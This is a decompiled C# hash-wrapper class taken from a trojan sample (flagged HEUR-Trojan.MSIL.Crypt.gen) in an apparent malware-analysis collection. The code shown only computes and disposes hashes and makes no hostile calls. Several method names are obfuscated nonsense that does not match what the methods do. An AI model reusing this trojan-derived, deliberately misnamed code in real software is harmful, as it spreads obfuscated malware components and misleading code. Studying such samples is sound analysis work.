// Decompiled with JetBrains decompiler
// Type: HashAlgorithmWrapper
// Assembly: wacYTAgLgQAjexermaa, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8B2A0664-5AE5-48FF-9B05-FC8D65B8BF2C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-31211fd1239d9e0de50a1af9ad1e71a55be0dac1e55e06444d2537caa96bd0c6.exe

using Org.BouncyCastle.Crypto;
using System;
using System.Security.Cryptography;

public class HashAlgorithmWrapper : IDisposable
{
  protected object HashAlgorithmObject;
  protected HashAlgorithmWrapper.ComputeHashDelegate ComputeHashDelegateInstance;

  public int HashSizeInBits { get; protected set; }

  public HashAlgorithmWrapper(HashAlgorithm HashAlg)
  {
    this.HashAlgorithmObject = (object) HashAlg;
    this.ComputeHashDelegateInstance = new HashAlgorithmWrapper.ComputeHashDelegate(HashAlg.ComputeHash);
    this.HashSizeInBits = HashAlg.HashSize;
  }

  public HashAlgorithmWrapper(IDigest BCIDigest)
  {
    this.HashAlgorithmObject = (object) BCIDigest;
    this.ComputeHashDelegateInstance = new HashAlgorithmWrapper.ComputeHashDelegate(this.GetPermissionsget_DefaultTranslationsget_Aliases);
    this.HashSizeInBits = BCIDigest.GetDigestSize() * 8;
  }

  public byte[] LogErrorExecuteGetCommand(byte[] data) => this.ComputeHashDelegateInstance(data);

  protected byte[] GetPermissionsget_DefaultTranslationsget_Aliases(byte[] data)
  {
    IDigest hashAlgorithmObject = (IDigest) this.HashAlgorithmObject;
    byte[] translationsgetAliases = new byte[hashAlgorithmObject.GetDigestSize()];
    hashAlgorithmObject.BlockUpdate(data, 0, data.Length);
    hashAlgorithmObject.DoFinal(translationsgetAliases, 0);
    hashAlgorithmObject.Reset();
    return translationsgetAliases;
  }

  public void Dispose() => this.Dispose(true);

  protected virtual void Dispose(bool disposing)
  {
    lock (this)
    {
      if (this.HashAlgorithmObject == null)
        return;
      try
      {
        if (this.HashAlgorithmObject is IDisposable)
          ((IDisposable) this.HashAlgorithmObject).Dispose();
      }
      catch
      {
      }
      try
      {
        if (this.HashAlgorithmObject is IDigest)
          ((IDigest) this.HashAlgorithmObject).Reset();
      }
      catch
      {
      }
      this.HashAlgorithmObject = (object) null;
    }
  }

  ~HashAlgorithmWrapper() => this.Dispose(false);

  protected delegate byte[] ComputeHashDelegate(byte[] data);
}
